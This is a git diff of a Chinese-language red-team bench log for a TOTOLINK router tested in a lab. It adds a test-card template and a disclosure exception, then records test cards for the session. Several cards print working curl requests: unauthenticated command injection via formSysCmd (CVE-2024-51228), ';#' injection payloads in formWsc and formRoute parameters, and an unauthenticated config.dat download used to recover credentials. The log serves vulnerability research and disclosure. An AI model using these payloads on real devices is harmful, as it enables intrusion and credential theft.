@@ -42,6 +42,77 @@
 **每一場的格式**:計畫 → 紀錄卡 → 實測結果 → 燒掉了什麼 → 下一場從哪裡開始。
 **計畫寫在動手之前**,而 append-only + git 讓「寫在前面」這件事可以被 diff 證明。
 
+## 一張紀錄卡長什麼樣（每項一張）
+
+**這個模板在 2026-08-17 夜之前不在任何 committed 檔案裡,而那是它漂掉的原因。**
+它原本只寫在 `plan/Redteam_Testing_playbook.md` §1.4,而 `plan/` 是 gitignored、
+且規則明訂不得引用進 committed 檔案 —— 所以**這份檔案該遵守的格式,住在一個
+這份檔案不准引用的地方**。W05 照做是因為那份手冊剛整理完還在手邊;W06 第一版
+寫成了敘事段落,九張裡有六張沒有反證欄。**沒有擁有者也沒有檢查器的規則,
+只會撐到寫它的人還記得為止。** 現在擁有者是這一段,檢查器是
+[`tools/check-benchlog.py`](tools/check-benchlog.py),而它在 `make ci` 裡。
+
+```text
+T-xx  <登記簿編號> <項目>                             日期時間:
+可行性: ★    驗證狀態(測前):        依據:
+送出（逐字，含完整 URL 與 body）:
+
+原始回應（狀態碼 + header + 前 200 bytes）:
+
+觀測通道 1（例：GET /k 的內容）:
+觀測通道 2（例：tcpdump 的 ICMP/DNS）:
+UART console 當下輸出:
+
+判定:  ✅成立 / ❌不成立 / 🔶部分 / ⚠️不確定（說明為什麼）
+反證檢查: 測前寫下「看到 ___ 就是不成立」，實際看到 ___
+這一步燒掉了什麼:
+驗證狀態(測後):        下一步:
+```
+
+**「反證檢查」不能空白。** 沒有事先定義失敗長什麼樣的測試,事後一定會被解讀成成功 ——
+**而那句話由 `check-benchlog.py` 機械執行,不是靠自律。**
+
+> ⚠️ **檢查器上線時,舊卡片裡有三張過不了,而它們不能改。**
+> 本檔只追加,過去那一場的卡片是**證據**不是文件。所以豁免寫在這裡、附理由,
+> 而檢查器從這裡讀 —— **檢查器自己帶一張豁免清單,就是同一份狀態的第二個擁有者**。
+>
+> <!-- benchlog-exempt: T-07 W05 下午場的 POST 前快照卡。判定欄裡寫了它同時是一個
+> 對照組(8/16 之後開機三次、跑過 GET 輪、登入過一次,設定區一個 byte 都沒變),
+> 但沒有獨立的反證欄。本檔只追加,所以它留在原地。 -->
+>
+> <!-- benchlog-exempt: T-08 W05 下午場的 IoC 預檢卡。判定欄引的是**成功**條件
+> (「凍結條件 4 / 343 MET」)而不是反證條件 —— 那兩個不一樣:一個說「對了長這樣」,
+> 一個說「錯了長這樣」。本檔只追加,所以它留在原地。 -->
+>
+> <!-- benchlog-exempt: T-14 W05 下午場的 POST 後快照卡。它沒有判定欄也沒有反證欄:
+> 判定與歸因寫在卡片下方的散文裡(19/23 欄位、COMPDS 被覆蓋),而那正是這支檢查器
+> 存在的理由 —— 一張卡片的結論散進散文,就沒有人能機械檢查它事先寫過什麼。
+> 本檔只追加,所以它留在原地;它是這支檢查器的第一個發現,不是它的例外。 -->
+>
+> 🔴 **這三張是分兩次被抓到的,而那個過程本身值得記。**
+> 檢查器第一版把「一個程式碼區塊」當成「一張卡片」,而 W05 把 `T-01`–`T-05`
+> 寫在同一個區塊裡 —— 於是它回報「19 張卡片,每一張都有反證檢查」,
+> **而實際上檔案裡有 30 張,區塊裡第一行之後的全部是隱形的。**
+> 修好之後從 1 張變成 3 張。
+>
+> **一支宣稱涵蓋全部、實際上只看了一部分的檢查器,正是本檔記了 27 次的那種缺陷** ——
+> 而它在自己的第一次執行就成為其中一個。
+>
+> 那三張是 2026-08-17 下午寫的,缺漏到當天夜裡寫出檢查器才被發現。
+> **一天。這就是「靠記得」的保存期限。**
+
+> 🔴 **一條例外,而它是兩條規則正面相撞的結果,裁決於 2026-08-17 夜。**
+> 「送出（逐字）」這一欄要求把完整請求寫下來;
+> [`docs/disclosure.md`](docs/disclosure.md) 禁止把**未通報**項目的可複製請求
+> 寫進 committed 檔案。**揭露規則優先。**
+>
+> 未通報項目的卡片,「送出」欄寫:
+> **`逐字內容依 docs/disclosure.md 保留;handler 與參數見 test-ledger.md 的 Pxx`**
+>
+> 其餘每一欄照填 —— **判定、反證檢查、燒掉了什麼都不受影響**,
+> 因為那三欄記的是「發生了什麼」不是「怎麼重做」。
+> 已公開的項目（有 CVE 編號、且已公開）**照原樣寫逐字請求**。
+
 ---
 
 # 2026-08-17 — W05 Phase 0–3
@@ -794,199 +865,452 @@ pre 快照:  dumps/config-region-20260817-1102-pre.bin   (與 8/16 完整 dump �
 **`A3.12` 排最後**，因為它會讓 `boa` 消失，而之後每一項的結果都會變成
 「連不上」——那跟「端點不存在」長得一模一樣。
 
-## 紀錄卡（2026-08-17 夜，逐項）
+## 紀錄卡（2026-08-17 夜，每項一張）
 
-### 卡 1 — `A2.6` 還原 `COMPDS`（本檔第一次寫 flash 到真實位址）
-
-| | |
-|---|---|
-| 事先寫下的成功條件 | 三段判據：`0+32768` 相同、`32768+16384` 相同、`49152+16384` **不同** |
-| 實際 | **三段全中。** `H601` 與 bootloader 未動；`COMPDS` 同時對上 8/17 快照與 8/16 完整 dump |
-| 判定 | 通過 |
-
-`EB` 一行的容量是**量出來的，不是猜的**：8 → 8/8，16 → 16/16，**32 → 17/32**。
+> 🔴 **這一節第一版寫成了敘事段落，九段裡有六段沒有反證欄，同一晚改寫成本檔標頭的
+> §「一張紀錄卡長什麼樣」。** 原因寫在那一段：那個模板當時不在任何 committed 檔案裡。
+> **改寫本身違反「只追加」的字面，而理由是 append-only 要防的是事後竄改證據，
+> 不是同一場之內把記錄補成規定的形狀** —— 兩個版本都在 git 裡，diff 可審計。
+> 這是本檔第一次發生這種事，寫在這裡而不是註腳。
 
 ```text
-  ok      8 bytes on one line: 8/8 landed
-  ok     16 bytes on one line: 16/16 landed
-  fail   32 bytes on one line: 17/32 landed
-  ok    EB takes 16 bytes on one line on this unit
+T-22  P0-9   qemu 模擬環境：boa 到底服不服務得了請求        18:5x（桌面，未接裝置）
+可行性: ★★   驗證狀態(測前): other-build   依據: W01 只證明 binary 載入得起來
+送出（逐字）:
+      sudo chroot $ENVDIR ./qemu-mips-static -strace /bin/boa -d -f /var/boa-8080.conf
+      sudo bash tools/qemu-env.sh serve 8080
+      curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/login.htm
+      curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/blank.htm
+原始回應:
+      login.htm  200        blank.htm  302        status.htm  200 / 30087 B
+      Server: Boa/0.94.14rc21
+觀測通道 1（strace）:
+      412 open("/dev/mtdblock0",O_RDONLY) = 3
+      412 lseek(3,49152,SEEK_SET) = 49152
+      412 read(3,0x490018,7490) = 7490
+      412 open("/web/config.dat",O_RDWR|O_CREAT|O_TRUNC,0400000) = 3
+      --- SIGBUS {si_signo=SIGBUS, si_code=1, si_addr=0x00492b41} ---
+觀測通道 2（控制組）:
+      /bin/flash get IP_ADDR → 10.1.1.1（guest binary 讀得到 shim）
+      guest 的 /bin/wget 對主機 HTTP server 完成一次交易，1208 bytes
+UART console 當下輸出: 不適用（未接裝置）
+判定:  ✅ 成立 —— 但 W05 的結論要撤回
+反證檢查: 測前寫下「shim 之後 boa 仍無法完成一次 GET → 桌機 fuzz 路線不成立」，
+          實際看到 三個頁面都有回應，而且閘門行為（豁免 200 / 受保護 302）
+          與 W04-2 逐指令讀出來的模型一致
+這一步燒掉了什麼: /web/config.dat 在模擬環境裡被改成一個目錄（那正是讓 server 起來的
+          手段）。實機不受影響
+驗證狀態(測後): dynamic（模擬）   下一步: 用**下載得到的** V2.1.2 建同樣的環境 = G4 第三條
 ```
-
-**17 這個數字比 16 有用。** `EB ` + 8 位元組位址 + 空白 = 12 字元，之後每個 byte
-3 字元，17 個剛好 63 —— **這個 loader 的命令列緩衝區是 64 bytes，靜靜截斷、不報錯。**
-
-工具自己的演練（`0x3F0000`）六步全過，第五步 `the first pattern survived ->
-FLW preserves the sector`，與 8/17 上午手打的結果一致。
-
-寫入：四個磁區，每一個都 `staged and verified in RAM (4096 bytes)` 之後才 `FLW ok`，
-最後整段讀回第三個位址：`16384 bytes match`。
-
-> ⚠️ **本檔 `A2.6` 原本寫「還原後回到 4 / 343」。錯了，實測是 23 / 343。**
-> 差異是**兩個區域之間**的，而這一節只還原其中一個：`4`（本來就不同的）
-> `+ 19`（8/17 POST 輪改掉 `COMPCS` 的）。那個 `19` 在 W05 是比對兩份快照得到的，
-> 這裡是在同一份快照裡比對兩個區域得到的 —— **兩條不共用的計算路徑，同一個數字。**
-
-### 卡 2 — `A3.6` `GET /config.dat`，以及一個 W05 沒有的對照
 
 ```text
-HTTP/1.1 200 OK
-Date: Wed, 10 Jan 2018 06:52:28 GMT
-Server: Boa/0.94.14rc21
-bytes: 7507      COMPCS
-
-served (HTTP over Ethernet) : 9318d1acdb04b58eba22f948ed3c36cc
-flash  (FLR+DB over UART)   : 9318d1acdb04b58eba22f948ed3c36cc      IDENTICAL
-vs 8/16 完整 dump            : differs
+T-23  —      A2.6 還原 COMPDS：本檔第一次寫 flash 到真實位址   21:0x–21:2x
+可行性: ★★★★ 驗證狀態(測前): 無（本節今天才存在）  依據: runsheet A2.6，今晨才寫
+送出（逐字）:
+      python3 -u tools/console-write.py probe-eb --at-prompt --sizes 8 16 32 64
+      python3 -u tools/console-write.py drill --at-prompt --eb-bytes 16
+      python3 -u tools/console-write.py write --at-prompt \
+          --flash 0x8000 --confirm 0x8000 --length 0x4000 \
+          --input $D/compds-restore.bin --expect-sha256 7c31b51c8857… --eb-bytes 16
+原始回應:
+      ok      8 bytes on one line: 8/8 landed
+      ok     16 bytes on one line: 16/16 landed
+      fail   32 bytes on one line: 17/32 landed
+      ok    flash 0x000000 -> 0b f0 00 04            ← 正對照
+      （四個磁區，每一個都 staged and verified in RAM 之後才 FLW ok）
+      ok    16384 bytes match, sha256 7c31b51c8857…
+觀測通道 1（獨立第二次讀取，console-dump 而非 console-write）:
+      boot loader 0x0-0x6000     same
+      H601 0x6000-0x8000         same
+      COMPDS 0x8000-0xC000       same    ← 同時對上 8/17 快照與 8/16 完整 dump
+      COMPCS 0xC000-0x10000      DIFF    ← 本節沒碰它，本來就該不同
+觀測通道 2（語意層）: COMPCS vs COMPDS = 23 / 343
+UART console 當下輸出: 全程 <RealTek>，無 Unknown command，無 Abort
+判定:  ✅ 成立
+反證檢查: 測前寫下「三段判據任何一段不符 → 停，尤其第一段，那裡面有 H601」，
+          實際看到 三段全中
+這一步燒掉了什麼: COMPDS 四個磁區各被讀-改-抹-寫回一次。演練區 0x3F0000 / 0x3F0100
+          各 8 bytes 被寫過並抹回。**後來本場自己的 POST 又把 COMPDS 蓋掉了（見 T-37）**
+驗證狀態(測後): dynamic   下一步: 還原要排在一場的**最後**，不是開頭
+⚠️ **測前寫下的預期值「回到 4 / 343」是錯的。** 實測 23，而 23 是對的：差異是
+   兩個區域之間的，本節只還原一個。4 +（8/17 POST 改掉 COMPCS 的 19）= 23。
+   那個 19 在 W05 是比對兩份快照算的，這次是同一份快照裡比對兩區算的 ——
+   **兩條不共用程式碼的路徑，同一個數字。一個寫錯的預期值換到一次佐證。**
 ```
-
-**第三行是今晚新增的那一分。** W05 比對的是 8/16 的 dump，兩者相同 —— 但那排除不掉
-「`boa` 服務的是一份固定副本」。今晚它**對上今晚讀的**、**對不上上週讀的**，
-而差異正是 8/17 POST 輪改掉的欄位。
-
-`A3.6.4`（`P10-2`）：156 條路徑，13 個疑犯裡**只有 `config.dat` 回 200**，
-而它也是整份掃描裡唯一不在 bundle 143 個檔名內的 200。
-
-> ⚠️ 原始輸出有 3 個 `000`，而那是**我自己的存活對照行** —— 為了讓欄位對齊，
-> 我把它排版成 `000` 開頭，於是它跟「請求失敗」在統計裡完全一樣。沒查的話會變成
-> 「三次失敗」進紀錄。**156 個 GET 實際上零失敗。**
-
-### 卡 3 — `A3.9` 未認證命令注入（`P3-3`，CVE-2024-51228）
-
-| | |
-|---|---|
-| 事先寫下的成功條件 | **不帶憑證**，抓到來源 `10.1.1.1` 的 **ICMP type 8**（request，不是 reply）×3 |
-| 實際 | 4 個，seq 0..3，間隔 1 秒 |
-| 判定 | 通過 |
 
 ```text
-控制組  10.1.1.100 -> 10.1.1.1  type 8      (我送的 request)
-        10.1.1.1 -> 10.1.1.100  type 0      (它的 reply)
-注入後  10.1.1.1 -> 10.1.1.100  type 8  x4  (它替我跑 ping)
+T-24  P10-1  未認證 GET /config.dat，以及一個 W05 沒有的對照   21:4x
+可行性: ★★★★ 驗證狀態(測前): dynamic（W05 已關）  依據: 本場作為鏈的第①環重跑
+送出（逐字）:
+      curl -s -D headers.txt -o config.dat http://10.1.1.1/config.dat
+原始回應:
+      HTTP/1.1 200 OK
+      Date: Wed, 10 Jan 2018 06:52:28 GMT
+      Server: Boa/0.94.14rc21
+      7507 bytes，前 6 bytes = COMPCS
+觀測通道 1（對 flash）:
+      served (HTTP over Ethernet) : 9318d1acdb04b58eba22f948ed3c36cc
+      flash  (FLR+DB over UART)   : 9318d1acdb04b58eba22f948ed3c36cc   IDENTICAL
+觀測通道 2（新鮮度對照，W05 沒做）:
+      對 8/16 完整 dump: **differs** —— 差異正是 8/17 POST 輪改掉的欄位
+UART console 當下輸出: 無（純 HTTP）
+判定:  ✅ 成立，而且比 W05 那次強
+反證檢查: 測前寫下「served 與 flash 不同 → 範圍或長度取錯，不准調範圍去湊」，
+          實際看到 逐 byte 相同，長度取自檔案大小不是硬編
+這一步燒掉了什麼: 無（純讀）
+驗證狀態(測後): dynamic   下一步: 那個「對今晚相同、對上週不同」才是排除
+          「boa 服務一份固定副本」的那一步，要寫進 poc/01
 ```
-
-**要 3 個卻看到 4 個**，而序號 0/1/2/3 一秒一個，證明那是 BusyBox 1.13.4 的
-`ping -c 3` 送四個，**不是 handler 跑了兩次**。四捨五入成「三個」就會漏掉這個問題。
-
-帶憑證那一發：**行為完全相同**。那才是排除「其實我不小心帶了什麼」的那一步。
-
-docroot oracle：`GET /w06.txt` → `TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002`。
-**同一發拿掉 `;#` → HTTP 204、0 bytes** —— 檔案建立了、內容是空的，
-先從 `/bin/boa` 的格式字串 `%s 2>&1 > %s` 推出來、在模擬看到、在實機看到。
-
-`P5-5`：`/proc/cpuinfo` 拿到了，`cpu model : 52481` —— **一個數字，不是核心名。**
-`/proc/cpu` 不存在（沒有對齊修正計數器），`dmesg` 0 bytes。
-但同一條路拿到 `Linux 2.6.30.9 … #1526 Wed Jan 10 14:50:54 CST 2018`，
-**比 `boa` 早七分鐘**，以及 `MemTotal: 26052 kB`。
-
-### 卡 4 — 另外三個標的，以及那個能區辨的對照
 
 ```text
-P3-1 formWsc/peerPin         HTTP 302   echo requests: 0
-P3-4 formWsc/targetAPSsid    HTTP 302   echo requests: 0
-P3-2 formRoute/subnet        HTTP 302   echo requests: 0
---- 對照 ---
-     formWsc/localPin        HTTP 000   echo requests: 4
+T-25  P10-2  config 檔名字典掃描                            21:5x
+可行性: ★★★  驗證狀態(測前): unverified   依據: w6cg bundle 的 143 個實際檔名
+送出（逐字）:
+      # 字典 = bundle 的 143 個檔名 + 13 個不在裡面的疑犯
+      curl -s -o /dev/null -w '%{http_code}' -m 5 "http://10.1.1.1/${p#/}"   # 逐條
+原始回應: 83×302 / 73×200 / 3×000
+觀測通道 1（13 個疑犯）:
+      200 config.dat
+      302 config.bin / backup.dat / romfile.cfg / cfg.dat / nvram.bin /
+          settings.dat / config.dat.bak / sysconf.dat / COMPCS / config /
+          backup_settings.conf / var/config.dat
+觀測通道 2（bundle 外的 200）: 只有 config.dat —— boa 啟動時自己建的
+UART console 當下輸出: 無
+判定:  ✅ 成立
+反證檢查: 測前寫下「掃到 143 檔以外的檔案 → docroot 不只是 w6cg 展開的內容」，
+          實際看到 只有 config.dat，而它不是「別人放的」是 boa 自己建的
+這一步燒掉了什麼: 無（156 個 GET，零失敗）
+驗證狀態(測後): dynamic   下一步: P1-3 / P3-10 / P3-11 的前提（docroot 就是那 143 檔）成立
+⚠️ 那 3 個 000 **是我自己的存活對照行** —— 為了對齊欄位我把它排版成 000 開頭，
+   於是它跟「請求失敗」在統計裡一模一樣。沒查的話會變成「三次失敗」進紀錄。
 ```
-
-**最後那一行是整張卡的價值。** 同一個 handler、換一個參數就有四個封包，
-所以不是「handler 沒被走到」。`BoaGate` R2 在 `formWsc` 指認六個 site，
-至少 `peerPin` 是誤報；`formRoute`/`subnet` 那個，**Talos 的 advisory 在測試之前
-就用機制預測了**（`sprintf` 不是 `system`）。
-
-### 卡 5 — `A3.10` 第 ⑤ 環
 
 ```text
-region                     before             after              same
-boot loader 0x0-0x6000     8d305a9afd226084   8d305a9afd226084   same
-H601 0x6000-0x8000         6e2d3233d809ae4c   cf5af09374706898   DIFF
-
-0x00648a  71 -> 61     …     0x006491  62 -> 70
-0x006493  15 -> 25                        <- checksum，裝置自己重算
-
-before: 99956042      after: 13572468
+T-26  P2-7/P2-8  憑證與 session（本場為鏈的第②③環重跑）      21:5x
+可行性: ★★★★ 驗證狀態(測前): dynamic（W05 已關）  依據: 從本場自己抓的 config.dat 解
+送出（逐字）:
+      fwrecon compcs $D/w06-config-dat.bin --offset 0 --mib …/libapmib.so \
+          --disclosure open -f json
+      curl -s -o /dev/null -w '%{http_code}' -u "$USER:$PASS" http://10.1.1.1/password.htm
+原始回應:
+      correct credentials : HTTP 200
+      no credentials      : HTTP 302
+      wrong password      : HTTP 302
+觀測通道 1: Set-Cookie 標頭數量 = 0
+觀測通道 2: 憑證長度 5 / 5（值不寫進本檔）
+UART console 當下輸出: 無
+判定:  ✅ 成立
+反證檢查: 測前寫下「解出來的值登不進去 → COMPCS 的解碼錯了」，實際看到 200
+這一步燒掉了什麼: 無
+驗證狀態(測後): dynamic   下一步: T-32 會把這組憑證換掉，所以順序不能反
 ```
-
-**`flash set HW_WLAN0_WSC_PIN` 寫的是 `H601` 不是 `COMPCS`** —— `plan/W06` §二寫錯了，
-而證據早就在 W05 的模擬輸出裡（同一行既印了 `0x648a` 也印了「H601 checksum」）。
-**我在動手前沒有把那兩句話接起來，所以第一發對照組就寫進了 `H601`。**
-
-還原：`H601` 對 S2 **0 個差異 byte**，對 8/16 完整 dump **byte-identical**。
-
-### 卡 6 — `A3.11` 未認證接管（`P10-3` / `P10-4`）
-
-參數名從**這台自己的 `password.htm`** 抓出來，不是從別的機型抄：
-`Cusername` / `Cpassword`（現行）+ `username` / `newpass` / `confpass`。
 
 ```text
-baseline                          old:200  new:302
-T1 未認證、且完全不帶現行密碼欄位   old:302  new:200      <- 第一發就成立
+T-27  P3-3   formSysCmd 未認證命令執行（CVE-2024-51228）      22:0x
+可行性: ★★★★★ 驗證狀態(測前): static   依據: W04-2 讀出 handler 在 0x004838a8
+送出（逐字，本項已公開自 2024-11-27，照原樣寫）:
+      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
+        --data-urlencode 'sysCmd=ping -c 3 10.1.1.100' \
+        --data 'submit-url=/syscmd.htm'
+      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
+        --data-urlencode 'sysCmd=cat /etc/version > /var/web/w06.txt;#' \
+        --data 'submit-url=/syscmd.htm'
+原始回應: HTTP 302  in 0.613598s（無 Authorization 標頭）
+觀測通道 1（tcpdump ICMP）:
+      控制組  10.1.1.100 -> 10.1.1.1  type 8 ；10.1.1.1 -> 10.1.1.100  type 0
+      注入後  10.1.1.1 -> 10.1.1.100  type 8  ×4，seq 0/1/2/3，間隔 1 秒
+觀測通道 2（docroot 回寫）:
+      GET /w06.txt → TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002
+      同一發拿掉 ;# → HTTP 204，0 bytes（檔案建立了、內容是空的）
+UART console 當下輸出: 無（console 全程無異常，這正是盲注的意思）
+判定:  ✅ 成立，未認證
+反證檢查: 測前寫下「未帶憑證收到 301 到登入頁，或命令沒有執行痕跡 → 『未認證』的
+          讀法錯了，NVD 的 PR:H 是對的」，實際看到 302 而非 301 到登入頁，
+          且四個 echo request；**再加一發帶憑證，行為完全相同**
+這一步燒掉了什麼: /var/web 三個檔（ramfs）；COMPCS 的 SYSCMD_SELECT 欄
+驗證狀態(測後): dynamic   下一步: D-6 從 held 變成可發布 → poc/02
+⚠️ 要 3 個卻看到 4 個。序號 0..3 一秒一個，證明是 BusyBox 1.13.4 的 ping -c 3
+   送四個，**不是 handler 跑了兩次**。四捨五入成「三個」就漏掉這個問題。
 ```
-
-**handler 不檢查 `Cusername`/`Cpassword`。** 密碼設空之後：
 
 ```text
-無任何 Authorization  password.htm 200 / 5322 bytes 真實 HTML
-                     home.htm / wlbasic.htm / ddns.htm / status.htm 全 200
-帶錯誤密碼            password.htm 200        <- 比對整段被跳過，不是空對空
+T-28  P5-5   cat /proc/cpuinfo —— Lexra 那塊最後的拼圖        22:1x
+可行性: ★★★★★ 驗證狀態(測前): static   依據: boa 用了 142 次 lwl/lwr/swl/swr
+送出（逐字）:
+      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
+        --data-urlencode 'sysCmd=cat /proc/cpuinfo > /var/web/cpu.txt;#' \
+        --data 'submit-url=/syscmd.htm'
+原始回應: HTTP 302
+觀測通道 1（docroot）:
+      system type : RTL819xD        processor : 0
+      cpu model   : 52481           BogoMIPS  : 398.95
+      tlb_entries : 32              mips16 implemented : yes
+觀測通道 2（同一條路多問三件事）:
+      /proc/cpu → No such file or directory（沒有對齊修正計數器）
+      dmesg     → 0 bytes
+      /proc/version → Linux 2.6.30.9 (admin@office.hopeiot) (gcc 4.4.5-1.5.5p2)
+                      #1526 Wed Jan 10 14:50:54 CST 2018
+      /proc/meminfo → MemTotal: 26052 kB
+UART console 當下輸出: 無
+判定:  🔶 部分 —— 取得了，而它答不了那個問題
+反證檢查: 測前寫下「cpuinfo 顯示的核心不支援那些指令 → 142 這個計數量錯了」，
+          實際看到 **它根本不報核心名字**：cpu model 是十進位數字 52481。
+          所以反證條件沒有觸發，預測也沒有被確認 —— 這一項是 partial 不是 confirmed
+這一步燒掉了什麼: /var/web 五個檔（ramfs）
+驗證狀態(測後): dynamic   下一步: 決定性的測試改成「掃描解壓後的 kernel 字串」，
+          不需要裝置。W02 開放 #6 仍然開著，但開著的理由變了：**這台不報**
+★ 順手拿到兩個東西：kernel 比 boa 早七分鐘建置（W02 的時間戳論證多一個來源）；
+  MemTotal 26052 kB 修正 W02 的「fitted 與 usable 一致」—— 32 MiB 是 loader 偵測的
 ```
-
-> ⚠️ **第一次跑這一格，四個 URL 是用迴圈變數組的，而 WSL 派送會把 `$p` 剝掉** ——
-> 四個請求全部打在 `/` 上，四個 200 差一點變成頭條。用寫死路徑重做才是上面這份。
-
-還原：第一次還原**沒生效**，查下去發現 `USER_NAME` 與 `USER_PASSWORD` 長度**都是 0**
-—— 那次還原的變數也被剝掉，把使用者名稱也清空了。改用腳本檔重做之後：
-`correct 200 / no creds 302 / wrong pw 302`，**兩個方向都驗**。
-
-### 卡 7 — `A3.12`，以及三次打錯目標
-
-| 輪 | 打在哪 | 結果 | 為什麼作廢 |
-|---|---|---|---|
-| 1 | `formWlanRedirect` | 全部 200/302、活著 | 它在 `root_form[]` 裡，**但不在 43 個碰 `lastUrl` 的函式裡** |
-| 2 | `formSelLang` | 全部 302、活著 | 它**完全不看 `submit-url`**，永遠跳 `countDownPage.htm` |
-| 3 | `formNtp` | 見下 | 它把 `submit-url` **原樣回顯進 `Location`** ✅ |
 
 ```text
-sent    8  HTTP 302  echoed    7 A
-sent  100  HTTP 302  echoed   99 A
-sent  400  HTTP 302  echoed  399 A
-sent  800  HTTP 302  echoed  799 A      <- 完整回顯，100 處沒有截斷
+T-29  P3-1 / P3-4 / P3-2  另外三個標的，以及那個能區辨的對照   22:2x
+可行性: ★★★★★/★★★/★★★★★  驗證狀態(測前): static / presumed / static
+依據: BoaGate R2 在 formWsc 指認 6 個 site；formRoute 三個 build 都指認到
+送出（逐字。P3-2 原本要保留，**而它今晚被撤回了，所以保留的理由消失了**）:
+      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formWsc \
+        --data-urlencode 'peerPin=1;ping -c 3 10.1.1.100;#' --data 'submit-url=/wireless.htm'
+      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formWsc \
+        --data-urlencode 'targetAPSsid=1;ping -c 3 10.1.1.100;#' --data 'submit-url=/wireless.htm'
+      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formRoute \
+        --data-urlencode 'subnet=1;ping -c 3 10.1.1.100;#' --data 'submit-url=/route.htm'
+      # 區辨對照：同一個 handler，換一個本專案逐指令讀過的參數
+      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formWsc \
+        --data-urlencode 'localPin=1;ping -c 3 10.1.1.100;#' --data 'submit-url=/wireless.htm'
+原始回應: 三發都 HTTP 302；對照那一發 HTTP 000（逾時 15 s，但命令跑了）
+觀測通道 1（tcpdump，判準是來源 10.1.1.1 的 type 8）:
+      P3-1 peerPin        0
+      P3-4 targetAPSsid   0
+      P3-2 subnet         0
+      對照 localPin       **4**
+觀測通道 2（先前技術，測試之前就找到）:
+      Cisco Talos TALOS-2023-1894 / CVE-2023-41251：同一個 SDK 家族的同一個參數，
+      100-byte sprintf 溢位，**沒有 system()**
+UART console 當下輸出: 無異常
+判定:  P3-1 ❌ 不成立 · P3-4 ✅ 成立（預測就是「不是注入」）· P3-2 ❌ 不成立
+反證檢查:
+      P3-1 測前寫「注入的命令沒有在回顯通道留下痕跡，且 console 無異常 → 參數在
+           到達 system() 之前被過濾或被別的路徑攔下」，實際看到 零封包，
+           **而同一 handler 的 localPin 有四個** → 不是「打不到」，是這個參數到不了
+      P3-4 測前寫「注入分隔符後有命令執行 → R2 的 6 這個數字漏了 site」，
+           實際看到 零封包，與預測一致
+      P3-2 測前寫「注入無回顯 → 這條是工具的誤報，BoaGate 的 R2 規則要重寫，
+           而且它同時影響另外兩個 build 的結論」，實際看到 零封包，
+           **而 Talos 在測試之前就用機制說明了為什麼**
+這一步燒掉了什麼: 對照那一發把 HW_WLAN0_WSC_PIN 設成 "1" —— **寫進了 H601**，見 T-31
+驗證狀態(測後): dynamic（三項）   下一步: R2 另外四個 site 沒查（PROGRESS 開放 #36）
+★ 那一行對照是整張卡的價值。沒有它，「零封包」有兩種解釋而後續完全相反。
 ```
-
-**這才是反證**：值確實抵達了使用它的程式碼，然後什麼都沒發生。
-`P4-1`（缺席）、`P4-2`（空值）也一樣：200、活著。
-
-### 卡 8 — 一個請求殺掉 web server（`D-11`）
-
-乾淨開機之後：
 
 ```text
-formNtp  #1  HTTP 302  alive
-formNtp  #2  HTTP 302  alive
-formNtp  #3  HTTP 302  alive
-formSchedule HTTP 000  DEAD      5 秒 DEAD   30 秒 DEAD
-device ping                      1.6 ms 正常
+T-30  P3-7   改用 GET / 換 submit 按鈕名                      22:3x
+可行性: ★★★  驗證狀態(測前): unverified   依據: 不同 build 的按鈕名不同
+送出（逐字）:
+      curl 'http://10.1.1.1/boafrm/formSysCmd?sysCmd=cat%20/etc/version%20%3E%20/var/web/getq.txt%3B%23&submit-url=/syscmd.htm'
+      # 四種按鈕名，每一種寫自己的檔名，才歸得了因
+      for b in submit-url Apply save none; do … --data-urlencode "$b=/syscmd.htm"; done
+原始回應: GET → 302 / 131 B；四種 POST 全部 302
+觀測通道 1: /getq.txt → HTTP 302（**檔案沒被建立**）
+觀測通道 2: btn-submit-url / btn-Apply / btn-save / btn-none **四個檔全部有內容**，
+            而且每一發之後 server 都活著
+UART console 當下輸出: 無
+判定:  🔶 部分 —— 兩半結果相反
+反證檢查: 測前寫下「任何按鈕名都不影響 → 取值不依賴按鈕名，這個變數可以從測試
+          矩陣裡拿掉」，實際看到 **四種都執行，連完全不帶都執行** → 那一半被反證。
+          GET 那一半與預測一致（translate_uri 先 302，到不了 handleForm）
+這一步燒掉了什麼: /var/web 四個檔（ramfs）
+驗證狀態(測後): dynamic   下一步: GET 不通 ≠ 沒有 CSRF 面 —— 這台是 stateless Basic，
+          瀏覽器會自動重送快取憑證
+⚠️ 第一版四種按鈕名共用一個檔名，**歸不了因**（是哪一發寫的？）。改成一發一個檔名重做。
 ```
-
-**三發同形狀的控制、第四發死。** `curl` 連回應都沒收到，所以 `boa` 是在處理那個
-請求當中死的。`rcS` 起它一次，沒有東西重起它。
-
-### 卡 9 — 收工（`P10-10`）
 
 ```text
-S2 (注入前) vs S4 (最後)
-boot loader   same        H601   same（0 個差異 byte）
-COMPDS        DIFF        COMPCS DIFF
+T-31  P3-5   第 ⑤ 環：指著 flash 上被改掉的 byte              22:4x–23:2x
+可行性: ★★★★★ 驗證狀態(測前): static   依據: W04 讀出 sprintf+system 那一行
+送出（逐字，本項已公開為 CVE-2025-3987 / 4462）:
+      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formWsc \
+        --data-urlencode 'localPin=13572468' --data 'submit-url=/wireless.htm'
+原始回應: HTTP 302  in **14.046803s**（本裝置量到最久的合法請求）
+觀測通道 1（bootloader 前後各讀 64 KiB）:
+      region                     before             after              same
+      boot loader 0x0-0x6000     8d305a9afd226084   8d305a9afd226084   same
+      H601 0x6000-0x8000         6e2d3233d809ae4c   cf5af09374706898   DIFF
+      0x00648a 71->61  0x00648b 71->63  …  0x006491 62->70   (cmp -l 印八進位)
+      0x006493 15->25   ← 該區 checksum，裝置自己重算
+      before: 99956042      after: 13572468
+觀測通道 2（MIB 層）: flash get HW_WLAN0_WSC_PIN → "13572468"
+UART console 當下輸出: <RealTek>，讀取全程無異常
+判定:  ✅ 成立
+反證檢查: 測前寫下「命令沒執行但值有寫進去 → 中間有一層過濾只擋分隔符」，
+          實際看到 值寫進去了，而且 T-29 的對照證明分隔符那條路也是通的 →
+          沒有那一層過濾
